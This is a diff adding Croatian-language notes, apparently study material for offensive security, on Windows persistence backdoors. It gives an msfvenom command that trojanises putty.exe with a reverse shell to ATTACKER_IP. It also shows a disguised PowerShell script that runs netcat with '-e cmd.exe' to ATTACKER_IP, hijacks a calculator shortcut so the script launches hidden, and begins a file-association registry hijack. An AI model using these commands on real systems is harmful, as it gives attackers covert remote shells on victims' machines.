@@ -1,0 +1,42 @@
+Backfoor preko datoteka postužemo preko omogucavanja datotekama s kojima korisnik radi da kada su pokrenute nama šalje reverse shell ili konekciju.
+Primjer sa putty:
+
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+-a je arhitektura, platforma je sustav na kojemu ce se pokretati, -x je executable na koji dodajemo exploit (MORAMO IMATI LOKALNO INSTALIRANO)
+-p je payload, -b je bad chars koji se izbjegavaju radi kompatibilnosti, f je vrsta datoteke, a -o je output name
+
+Kada to izgeneriramo zamjenjujemo legitimnu putty datoteku sa puttyX.exe
+
+Mogli bi isto umjesto mjenjaja .exe datoteke promjeniti na što shourtcut pokazuje.
+To postizemo da shortcut za tipa chrome pokazuje na exploit i kada se klikne ne njega se pokrene exploit koji pokrece chrome
+Kako bi to napravili za kalkulator:
+
+U c:\windows\system32 kreiramo novu ps1 (powershell) datoteku slicnog naziva kao kalkulator.exe
+On ce imati ovakav sadržaj:
+`
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+C:\Windows\System32\calc.exe
+`
+I sve sto nam je ostalo za napraviti je zamjenjiti shortcut za kalkulator sa prikladnom naredbom:
+
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+(kada se to tako napravi žrtvi ce kada pokrene neki program iskociti powershell prozor)
+
+File assosiacije
+
+U registriju je zapisano koje ekstenzije otvara koji program.
+Npr ako datoteka zavrsava sa .txt onda ce ga automatski otvoriti notepad (osim ako nije odabrano drukcije)
+Ono sto mi zelimo da kada pokrenemo datoteku ekstenzine .txt da pokremo preko nase skripte, tako da se pokrene nas payload u pozadini
+Trebamo pronaci u registriju:
+
+HKLM (HKEY_Local_Machine)\Software\Classes\
+i tu trazimo ekstenziju .txt ili ostale
+Kada otvorimo .txt vidjeti cemo redove, no nas zanima redak sa imenom Default, Primjer:
+
+Name: (Default) Type: REG_SZ Data: txtfile 
+
+ProgId (Programmic ID) je informacije u stupcu data, u nasem slucaju txtfile
+Pokusavamo pronaci taj ProgId u registriju (također je u direktoriju HKEY_Local_Machine\Software\Classes)
+Nakon sto ga pronademo, pokusavamo pronaci folder \command u njemu
+
